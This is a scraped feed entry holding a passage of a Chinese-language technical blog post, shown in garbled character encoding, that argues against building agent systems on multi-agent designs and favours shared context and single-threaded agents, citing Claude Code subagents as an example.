</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆä¸å»ºè®®åŸºäºMulti-Agentæ¥æ„å»ºAgentå·¥ç¨‹ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592822714067877939</link>    <guid>https://juejin.cn/post/7592822714067877939</guid>    <pubDate>2026-01-08T12:20:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592822714067877939" data-draft-id="7592816646870597641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆä¸å»ºè®®åŸºäºMulti-Agentæ¥æ„å»ºAgentå·¥ç¨‹ï¼Ÿ"/> <meta itemprop="keywords" content="Agent,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T12:20:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºæ–°è§†ç•Œ"/> <meta itemprop="url" content="https://juejin.cn/user/3368559359568696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆä¸å»ºè®®åŸºäºMulti-Agentæ¥æ„å»ºAgentå·¥ç¨‹ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559359568696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºæ–°è§†ç•Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:20:46.000Z" title="Thu Jan 08 2026 12:20:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨LLMæ¶Œç°çš„æ—©æœŸå·²ç»æœ‰å¤§é‡çš„ç ”å‘äººå‘˜å¼€å§‹æ€è€ƒã€è®¨è®ºå’Œæ¨å¹¿Multi-Agentçš„æ¦‚å¿µã€‚å®ƒçš„åŸºæœ¬å®ç°é€»è¾‘å°±æ˜¯ï¼šåˆ©ç”¨LLLMçš„å½’çº³æ¨ç†èƒ½åŠ›ï¼Œé€šè¿‡ä¸ºä¸åŒçš„Agentåˆ†é…è§’è‰²ä¸ä»»åŠ¡ï¼Œå¹¶é…åˆç›¸åº”çš„å·¥å…·ï¼ˆtoolsï¼‰æ’ä»¶æ¥å®Œæˆå¤æ‚çš„ä»»åŠ¡ã€‚</p>
<p>ä½†ç»è¿‡è¿™ä¸¤ä¸‰å¹´çš„å‘å±•ï¼Œå…³äºMulti-Agentçš„è®¨è®ºä¾æ—§å­˜åœ¨æˆªç„¶ä¸åŒçš„è§‚ç‚¹ï¼ŒçœŸå®æ¡ˆä¾‹æ›´å¯¥å¯¥å¯æ•°ï¼Œä¹Ÿæ²¡æœ‰å½¢æˆæ ‡å‡†çš„è¡Œä¸šèŒƒå¼ã€‚åœ¨Manuså†…éƒ¨äººå‘˜çš„è®¿è°ˆè®°å½•ä¸­ï¼Œä¹Ÿå¦è¨€ï¼Œåœ¨Manusçš„åŠŸèƒ½å®ç°ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨å¤æ‚çš„Multi-Agentå·¥ç¨‹ã€‚</p>
<p>åœ¨æœ¬äººä¸»å¯¼å¼€å‘çš„AIåŸç”Ÿé¡¹ç›®ä¸­ï¼Œä½¿ç”¨äº†å¤§é‡çš„åŸºäºLLMçš„Workflowèƒ½åŠ›ï¼Œä½†å¯¹äºMulti-Agentä¹Ÿæ˜¯æœ›è€Œå´æ­¥ï¼Œå› ä¸ºå®è·µçš„ç»“æœä¸é¢„æœŸçš„å·®è·å¤ªå¤§ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ç»“åˆå›½å¤–ä¸€ç¯‡å…³äºMulti-Agentè§‚å¿µï¼Œä¸€èµ·èŠèŠå¯¹äºMulti-Agentçš„è§‚ç‚¹å’Œçœ‹æ³•ã€‚</p>
<h2 data-id="heading-1">Agentæ—¶ä»£çš„ç°çŠ¶</h2>
<p>éšç€LLMçš„å¿«é€Ÿçªç ´ï¼Œç›®å‰ç®—æ˜¯æ­£å¼è¿›å…¥äº†LLMå’ŒAI Agentæ—¶ä»£çš„æ—©æœŸã€‚è¿™ä¸ªæ—¶æœŸå¯ä»¥ç”¨Webå¼€å‘æ¥è¿›è¡Œç±»æ¯”ï¼Œå°±ç›¸å½“äºæ­£å¤„äºä½¿ç”¨åŸå§‹çš„HTML &amp; CSSæ¥å¼€å‘ç½‘é¡µçš„æ—¶ä»£ã€‚è‡³äºåƒWebå¼€å‘åé¢çš„Reactï¼ˆåŠå…¶è¡ç”Ÿæ¡†æ¶ï¼‰ä»¥åŠç›¸å…³çš„è„šæ‰‹æ¶ã€æ„å»ºæ¨¡å¼ä»¥åŠå¼€å‘å“²å­¦ç­‰ï¼Œéƒ½è¿˜å¤„äºå¤§ä¼—æ¢ç´¢åˆ›æ–°çš„é˜¶æ®µã€‚</p>
<p>ç›®å‰å¯¹äºLLMå’ŒAI Agentçš„ä½¿ç”¨ï¼Œå¤§å®¶éƒ½æ˜¯åœ¨ä¸€è¾¹æ‘¸ç´¢ä¸€è¾¹å‰è¡Œï¼Œæ¯”å¦‚æ¢ç´¢å¦‚ä½•æŠŠè¿™äº›åŠŸèƒ½æ‹¼åˆ°ä¸€èµ·ï¼Œå¦‚ä½•æä¾›è‰¯å¥½çš„ä½“éªŒï¼Œå¦‚ä½•ä¿è¯ç³»ç»Ÿçš„é²æ£’æ€§ç­‰ã€‚é™¤äº†å‡ ç§æœ€åŸºç¡€çš„æ–¹å¼ä¹‹å¤–ï¼Œè¿˜æ²¡æœ‰å“ªä¸€ç§Agentæ„å»ºæ–¹æ³•æˆä¸ºä¸»æµæ ‡å‡†ã€‚</p>
<p>å³ä¾¿æ˜¯OpenAIçš„Swarmç±»åº“å’Œå¾®è½¯çš„Autogenç±»åº“ä¸­æ¨å´‡çš„ä¸€äº›æ¦‚å¿µï¼Œä¹Ÿæ²¡æœ‰å¾—åˆ°æ™®éçš„è®¤å¯ï¼Œç”šè‡³æ˜¯é”™è¯¯çš„Agentæ„å»ºæ–¹æ³•ã€‚</p>
<p>å½“è¿›è¡ŒAgentæ„å»ºæ—¶ï¼Œå¸‚é¢ä¸Šå·²ç»æœ‰ä¸å°‘åŸºç¡€çš„è„šæ‰‹æ¶é¡¹ç›®ï¼Œä½†çœŸæ­£æ‹¿å®ƒä»¬æ¥è¿ç”¨åˆ°ç”Ÿäº§é¡¹ç›®ä¸­ï¼Œè¿˜æ˜¯æœ‰å¾ˆé•¿çš„è·ç¦»ã€‚</p>
<h2 data-id="heading-2">é•¿æ—¶è¿è¡ŒAgentçš„æ„å»ºç†è®º</h2>
<p>é•¿æ—¶è¿è¡ŒAgentï¼ˆLong-running Agentsï¼‰ï¼Œé€šå¸¸æ˜¯æŒ‡AIèƒ½å¤Ÿè·¨å¤šä¸ªä¼šè¯ã€å¤šæ¬¡å·¥å…·è°ƒç”¨å’Œå¤šé˜¶æ®µäº§ç‰©ï¼Œæ¥å®Œæˆä¸€ä¸ªç›®æ ‡ã€‚é•¿æ—¶è¿è¡ŒAgentæ›´å¼ºè°ƒå¤§æ¨¡å‹çš„è‡ªæ²»ä»¥åŠåŠ¨æ€ä¸Šä¸‹æ–‡çš„ç®¡ç†ï¼Œéœ€è¦AI Agentèƒ½å¤Ÿæ”¯æŒé•¿æ—¶é—´çš„è¿è¡Œæ¥è§£å†³é—®é¢˜ï¼ŒåŒæ—¶ï¼Œè¿˜éœ€è¦æ›´å¥½çš„è‡ªä¸»è§„åˆ’ä¸è°ƒåº¦èƒ½åŠ›ï¼Œé€‰æ‹©è¡Œä½¿ç”¨ä¸Šä¸‹æ–‡çš„èƒ½åŠ›ç­‰ã€‚</p>
<p>å¦å¤–ï¼Œä¸€ä¸ªå¾ˆé‡è¦çš„æŒ‡æ ‡å°±æ˜¯å¯é æ€§ï¼ŒAgentæƒ³è¦çœŸæ­£çš„å¯é ã€é•¿æ—¶é—´è¿è¡Œã€ä»¥åŠä¿æŒè¿è´¯å¯¹è¯ï¼Œå°±å¿…é¡»åšä¸€äº›é¢å¤–çš„äº‹æ¥æ§åˆ¶é”™è¯¯çš„ç´¯ç§¯ã€‚å¦åˆ™ï¼Œä¸€ä¸ªå°çš„é”™è¯¯ï¼Œåœ¨åç»­æ­¥éª¤ä¸­æ”¾å¤§ï¼Œå½¢æˆé”™è¯¯é“¾ï¼Œé€ æˆæ•´ä¸ªAgentå·¥ç¨‹çš„ä¸å¯æ§ã€‚è€Œå¯é æ€§çš„æ ¸å¿ƒä¿éšœå°±æ˜¯â€œä¸Šä¸‹æ–‡å·¥ç¨‹â€ã€‚</p>
<h2 data-id="heading-3">ä¸Šä¸‹æ–‡å·¥ç¨‹</h2>
<p>æˆªè‡³ç›®å‰ï¼Œå¸‚é¢ä¸Šçš„å¤§æ¨¡å‹å·²ç»éå¸¸æ™ºèƒ½äº†ï¼Œä½†å°±ç®—æœ€èªæ˜çš„äººï¼Œæ²¡æœ‰äº†è§£æ¸…æ¥šè‡ªå·±è¢«è¦æ±‚åšä»€ä¹ˆçš„ä¸Šä¸‹æ–‡ï¼Œä¹Ÿæ— æ³•é«˜æ•ˆå·¥ä½œã€‚</p>
<p>â€œPrompt engineeringâ€æ›¾æ˜¯LLMèŠå¤©æœºå™¨äººéœ€è¦å°†ä»»åŠ¡ä»¥ç†æƒ³æ ¼å¼è¡¨è¾¾æ—¶çš„äº§ç‰©ï¼Œè€Œâ€œä¸Šä¸‹æ–‡å·¥ç¨‹â€åˆ™æ˜¯ä¸‹ä¸€ä¸ªé˜¶æ®µã€‚å®ƒçš„æ„ä¹‰ï¼Œæ˜¯è¦åœ¨åŠ¨æ€ç³»ç»Ÿä¸­è‡ªåŠ¨å®Œæˆè¿™ä»¶äº‹ã€‚è¿™æ›´å¾®å¦™ï¼ŒåŸºæœ¬ä¸Šä¹Ÿæ˜¯Agentå·¥ç¨‹å¸ˆçš„é¦–è¦å·¥ä½œã€‚</p>
<p>ä¸¾ä¸ªå¸¸è§çš„Agentä¾‹å­ï¼š</p>
<ul>
<li>æŠŠè‡ªå·±çš„ä»»åŠ¡åˆ†è§£æˆå‡ ä¸ªéƒ¨åˆ†ï¼›</li>
<li>å¯åŠ¨å­Agentå¤„ç†è¿™äº›éƒ¨åˆ†ï¼›</li>
<li>æœ€åæŠŠå„éƒ¨åˆ†ç»“æœåˆå¹¶èµ·æ¥</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a1ad35358c40ce8240e8d82f3db95e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=bAsrlBeZRe8YpP6GFN8RYgAKouE%3D" alt="å›¾1" loading="lazy"/></p>
<p>è¿™ç§æ¶æ„å¾ˆæœ‰è¯±æƒ‘åŠ›ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤šä¸ªå¹¶è¡Œç»„ä»¶çš„ä»»åŠ¡æ—¶ã€‚ä¸è¿‡ï¼Œè¿™ç§æ¶æ„ä¹Ÿéå¸¸è„†å¼±ï¼Œå®ƒçš„æ ¸å¿ƒé—®é¢˜æ˜¯ï¼š</p>
<p>å‡è®¾æ‰€éœ€çš„ä»»åŠ¡æ˜¯â€œåšä¸€ä¸ªFlappy Birdçš„å…‹éš†ç‰ˆâ€ã€‚ä»»åŠ¡ä¼šè¢«æ‹†åˆ†ä¸ºä¸¤ä¸ªå­ä»»åŠ¡ï¼šå­ä»»åŠ¡ä¸€æ˜¯â€œåšä¸€ä¸ªæœ‰ç»¿è‰²ç®¡é“å’Œç¢°æ’ç›’çš„ç§»åŠ¨æ¸¸æˆèƒŒæ™¯â€ï¼Œå­ä»»åŠ¡äºŒæ˜¯â€œåšä¸€ä¸ªèƒ½ä¸Šä¸‹ç§»åŠ¨çš„å°é¸Ÿâ€ã€‚</p>
<p>ç»“æœï¼ŒSubagent1 æé”™äº†å­ä»»åŠ¡ï¼Œåšå‡ºäº†ä¸€ä¸ªçœ‹èµ·æ¥åƒè¶…çº§é©¬é‡Œå¥¥å…„å¼Ÿçš„èƒŒæ™¯ã€‚Subagent2 å®ç°äº†å°é¸Ÿï¼Œä½†å®ƒæ—¢ä¸åƒæ¸¸æˆç´ æï¼Œä¹Ÿæ²¡æœ‰ Flappy Bird çš„ç§»åŠ¨æ–¹å¼ã€‚ç°åœ¨æœ€ç»ˆçš„ Agent åªèƒ½æŠŠè¿™ä¸¤ä¸ªè¯¯è§£çš„ç»“æœæ‹¼åˆ°ä¸€èµ·ï¼Œå˜æˆä¸€ä¸ªå°´å°¬çš„åˆæˆå“ã€‚</p>
<p>ä¹Ÿè®¸è¿™ä¸ªä¾‹å­æœ‰ç‚¹ç”Ÿç¡¬ï¼Œä½†ç°å®ä¸­çš„ä»»åŠ¡å¾€å¾€æœ‰è®¸å¤šç»†å¾®å±‚é¢ï¼Œæ¯ä¸€å±‚éƒ½æœ‰å¯èƒ½è¢«è¯¯è§£ã€‚</p>
<p>ä½ å¯èƒ½ä¼šè®¤ä¸ºï¼Œç®€å•çš„åŠæ³•å°±æ˜¯æŠŠåŸå§‹ä»»åŠ¡å†…å®¹ä¹Ÿå¤åˆ¶ç»™Subagentä½œä¸ºä¸Šä¸‹æ–‡ï¼Œè¿™æ ·å®ƒä»¬å°±ä¸ä¼šè¯¯è§£è‡ªå·±çš„å­ä»»åŠ¡äº†ã€‚ä½†åˆ«å¿˜äº†ï¼Œåœ¨å®é™…ç”Ÿäº§ç³»ç»Ÿä¸­ï¼ŒAgent å¾€å¾€æ¶‰åŠå¤šè½®å¯¹è¯ï¼Œç»å¸¸éœ€è¦è°ƒç”¨å·¥å…·æ¥å†³å®šå¦‚ä½•æ‹†è§£ä»»åŠ¡ï¼Œå¾ˆå¤šç»†èŠ‚éƒ½ä¼šå½±å“å¯¹ä»»åŠ¡çš„è§£è¯»ã€‚</p>
<p><strong>åŸåˆ™ä¸€ï¼šå…±äº«ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”å…±äº«å®Œæ•´çš„Agentè½¨è¿¹ï¼ˆtraceï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯å•ç‹¬çš„ä¿¡æ¯æ–‡æœ¬ã€‚</strong></p>
<p>ç°åœ¨å¯¹Agentæ¶æ„è¿›è¡Œä¸‹ä¸€æ­¥æ”¹è¿›ï¼Œè¿™æ¬¡è¦ç¡®ä¿æ¯ä¸ªAgentéƒ½èƒ½è·å¾—å‰é¢Agentçš„å®Œæ•´ä¸Šä¸‹æ–‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8458c5d65d254ba684756f9aba6b302d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=mq2Hqb%2BIbQHFaVcTVm5wvWIRacU%3D" alt="å›¾2" loading="lazy"/></p>
<p>å¾ˆé—æ†¾ï¼Œäº‹æƒ…è¿˜æ²¡é‚£ä¹ˆç®€å•ã€‚å½“å†æ¬¡ç»™Agentæå‡ºFlappy Birdçš„å…‹éš†ä»»åŠ¡æ—¶ï¼Œæœ€ç»ˆå¯èƒ½å¾—åˆ°çš„æ˜¯ä¸€åªå°é¸Ÿå’Œä¸€ä¸ªèƒŒæ™¯ï¼Œä½†å®ƒä»¬çš„è§†è§‰é£æ ¼å®Œå…¨ä¸åŒã€‚Subagent1 å’ŒSubagent2 å¹¶ä¸çŸ¥é“å¯¹æ–¹åœ¨åšä»€ä¹ˆï¼Œæ‰€ä»¥å„è‡ªå®Œæˆçš„éƒ¨åˆ†æ ¹æœ¬ä¸ç»Ÿä¸€ã€‚</p>
<p>Subagent1å’ŒSubagent2æ‰€é‡‡å–çš„åŠ¨ä½œï¼Œéƒ½æ˜¯åŸºäºå„è‡ªä¸åŒä¸”äº‹å…ˆæœªæ˜ç¡®è§„å®šçš„å‡è®¾ã€‚</p>
<p><strong>åŸåˆ™äºŒï¼šåŠ¨ä½œä¼šå¸¦æ¥éšå«çš„å†³ç­–ï¼Œè€Œå†²çªçš„å†³ç­–ä¼šå¸¦æ¥ç³Ÿç³•çš„ç»“æœã€‚</strong></p>
<p>åŸåˆ™ä¸€å’ŒåŸåˆ™äºŒéå¸¸å…³é”®ï¼Œå‡ ä¹æ²¡æœ‰è¿èƒŒå®ƒä»¬çš„ç†ç”±ï¼Œæ‰€ä»¥é»˜è®¤å°±åº”è¯¥æ’é™¤ä»»ä½•ä¸éµå®ˆè¿™ä¸¤ä¸ªåŸåˆ™çš„Agentæ¶æ„ã€‚ä¹Ÿè®¸ä½ è§‰å¾—è¿™æ ·æœ‰äº›å±€é™ï¼Œä½†å…¶å®è¿˜æœ‰å¾ˆå¤šå¯ä»¥æ¢ç´¢çš„ä¸åŒæ¶æ„æ–¹å¼ã€‚</p>
<p>éµå¾ªè¿™äº›åŸåˆ™æœ€ç®€å•çš„æ–¹æ³•ï¼Œå°±æ˜¯é‡‡ç”¨å•çº¿ç¨‹ã€çº¿æ€§å¼çš„Agentï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bcf628fec56415b8f3dc3165887f3b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=JtEoAY6kHx232gNlAU7CyHgqqlU%3D" alt="å›¾3" loading="lazy"/></p>
<p>åœ¨è¿™ç§æ¶æ„ä¸‹ï¼Œä¸Šä¸‹æ–‡æ˜¯è¿ç»­çš„ã€‚ä¸è¿‡ï¼Œå¦‚æœä»»åŠ¡éå¸¸åºå¤§ã€åŒ…å«å¤§é‡å­ä»»åŠ¡ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸Šä¸‹æ–‡çª—å£æº¢å‡ºçš„æƒ…å†µã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8740fb520974bd9a8bb5bf25a066a84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=uNjhfARtBne2RX0qE2QSBbtqGt8%3D" alt="å›¾4" loading="lazy"/></p>
<p>è¿™ç§ç®€å•çš„æ¶æ„å·²ç»èƒ½åº”å¯¹ç»å¤§å¤šæ•°åœºæ™¯ï¼Œä½†å¦‚æœä½ çš„ä»»åŠ¡çœŸçš„éœ€è¦é•¿æ—¶é—´è¿è¡Œï¼Œå¹¶ä¸”ä½ æ„¿æ„æŠ•å…¥æ›´å¤šç²¾åŠ›ï¼Œå…¶å®è¿˜å¯ä»¥åšå¾—æ›´å¥½ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bb2aa9ec5994d66a024fe8b0ff1f408~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=sZ6PTxoj6SNtRlnVQGwtDiFmFB0%3D" alt="å›¾5" loading="lazy"/></p>
<p>åœ¨è¿™ä¸ªæ¶æ„ä¸­ï¼Œå¼•å…¥äº†ä¸€ä¸ªæ–°çš„ LLM æ¨¡å‹ï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯å°†ä¸€ç³»åˆ—çš„åŠ¨ä½œå’Œå¯¹è¯å†å²å‹ç¼©æˆå…³é”®ç»†èŠ‚ã€äº‹ä»¶å’Œå†³ç­–ã€‚</p>
<p>è¿™å…¶å®å¾ˆéš¾åšå¥½ï¼Œéœ€è¦æŠ•å…¥ç²¾åŠ›ææ¸…æ¥šå“ªäº›æ‰æ˜¯çœŸæ­£é‡è¦çš„ä¿¡æ¯ï¼Œå¹¶æ­å»ºä¸€ä¸ªæ¨¡å‹æ“…é•¿è¯†åˆ«è¿™äº›å†…å®¹çš„ç³»ç»Ÿã€‚æ ¹æ®ä¸åŒé¢†åŸŸï¼Œç”šè‡³å¯èƒ½éœ€è¦å¾®è°ƒä¸€ä¸ªæ›´å°çš„æ¨¡å‹ã€‚</p>
<p>è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥è®©Agentåœ¨æ›´é•¿çš„ä¸Šä¸‹æ–‡ä¸­ä»ç„¶é«˜æ•ˆå·¥ä½œã€‚å½“ç„¶ï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šé‡åˆ°ä¸Šä¸‹æ–‡é•¿åº¦çš„æé™ã€‚</p>
<h2 data-id="heading-4">åŸåˆ™çš„åº”ç”¨æ¡ˆä¾‹</h2>
<p>ä½œä¸ºAgentçš„å¼€å‘è€…ï¼Œè¦ç¡®ä¿Agentçš„æ¯ä¸€æ­¥æ“ä½œéƒ½å‚è€ƒäº†ç³»ç»Ÿå…¶å®ƒéƒ¨åˆ†å·²ç»åšå‡ºçš„æ‰€æœ‰ç›¸å…³å†³ç­–çš„ä¸Šä¸‹æ–‡ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåŠ¨ä½œéƒ½èƒ½â€œçœ‹åˆ°â€å…¶å®ƒæ‰€æœ‰åŠ¨ä½œçš„ä¿¡æ¯ã€‚</p>
<p>å¯æƒœï¼Œå—é™äºä¸Šä¸‹æ–‡çª—å£å’Œå®é™…å·¥ç¨‹æƒè¡¡ï¼Œè¿™å¾€å¾€åšä¸åˆ°ï¼Œéœ€è¦ç»“åˆå¯é æ€§ç›®æ ‡ï¼Œå†³å®šAgentèƒ½æ¥å—å¤šå¤æ‚çš„æ¶æ„ã€‚</p>
<p>åœ¨æ€è€ƒå¦‚ä½•æ¶æ„Agentã€é¿å…å†²çªå†³ç­–æ—¶ï¼Œè¿™é‡Œæœ‰ä¸€äº›çœŸå®æ¡ˆä¾‹å¯ä»¥å‚è€ƒï¼š</p>
<h3 data-id="heading-5">Claude Code å­Agent</h3>
<p>Claude Codeæ˜¯ä¸€ä¸ªèƒ½å¤Ÿç”Ÿæˆå­ä»»åŠ¡çš„ Agent ç¤ºä¾‹ã€‚ä¸è¿‡ï¼Œå®ƒä¸ä¼šè·Ÿå­Agentå¹¶è¡Œåšäº‹ï¼Œè€Œä¸”å­Agenté€šå¸¸åªæ˜¯è¢«è¦æ±‚å›ç­”ä¸€ä¸ªé—®é¢˜ï¼Œä¸ä¼šå»å†™ä»»ä½•ä»£ç ã€‚</p>
